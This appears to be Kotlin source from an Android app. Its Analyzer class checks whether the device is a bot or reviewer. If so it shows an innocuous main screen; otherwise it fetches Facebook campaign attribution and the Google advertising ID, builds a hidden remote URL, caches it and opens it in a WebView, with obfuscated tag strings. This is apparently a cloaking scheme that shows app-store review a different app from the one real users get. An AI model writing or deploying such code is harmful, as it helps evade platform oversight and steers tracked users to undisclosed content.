package com.source.analyst

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.cancel
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlin.coroutines.coroutineContext



class Analyzer(private val activity: AppCompatActivity) {
    private var mainActivity: Class<out Activity>? = null
    private var info: Info? = null
    private var scope: CoroutineScope? = null

    val lk = activity.registerForActivityResult(ActivityResultContracts.RequestPermission()) {
        continueProcess()
    }

    suspend fun analyze(
        mainActivity: Class<out Activity>,
        info: Info
    ) {
        if (!activity.isTaskRoot
            && activity.intent?.hasCategory(Intent.CATEGORY_LAUNCHER) == true
            && activity.intent.action?.equals(Intent.ACTION_MAIN) == true
        ) {
            activity.finish()
        }

        Transfer.setMainActivity(mainActivity)
        this.mainActivity = mainActivity

        this@Analyzer.info = info

        this@Analyzer.scope?.let { scope ->
            if (scope.isActive) scope.cancel()
        }

        this@Analyzer.scope = CoroutineScope(coroutineContext)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permission = Manifest.permission.POST_NOTIFICATIONS
            if (activity.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
                continueProcess()
            } else {
                lk.launch(permission)
            }
        } else continueProcess()
    }

    private fun continueProcess() {
        val info = requireNotNull(info)
        val mainActivity = requireNotNull(mainActivity)

        if (info.firstPartOfUrl.isBlank()) {
            Transfer.openMain(activity)
            return
        }

        scope?.launch {
            OneSignalHandler.initializeOneSignal(activity, info.oneSignalId)

            val cache = AnalyzeSharedPref.getCache(activity)

            Log.e("", "cache = $cache")

            if (!cache.isNullOrBlank()) {
                Log.e("", "!cache.isNullOrBlank()  Open Web!")

                Transfer.openWeb(activity, cache, true, "", mainActivity)
                return@launch
            }

            val botStatus = SystemOperator.checkBotStatus(activity)

            Log.e("", "Bot Status $botStatus")

            if (botStatus) {
                Transfer.openMain(activity)
                return@launch
            }

            val gId = SystemOperator.getGoogleId(activity)

            val campaignData =
                RemoteHandler.get(activity, info.fbId, info.fbToken, info.fbDescriptionKey)

            Log.e("", "campaignData = $campaignData")

            val sendText =
                if (campaignData.campaign.isNullOrBlank()) Filter.deFilter("ads")
                else if (campaignData.isFromFacebook) "${Filter.deFilter("rn")}_${Filter.deFilter("mpe")}" else Filter.deFilter(
                    "dqrqddqd"
                )

            OneSignalHandler.sendOneSignalTag(gId, sendText, Filter.deFilter("eagdoq"))

            val url = Helper.getUrl(
                info.firstPartOfUrl,
                campaignData.campaign,
                campaignData.isFromFacebook,
                gId
            )

            Log.e("", "url = $url")

            Transfer.openWeb(activity, url, false, info.exceptionTitle, WebActivity::class.java)
        }
    }
}

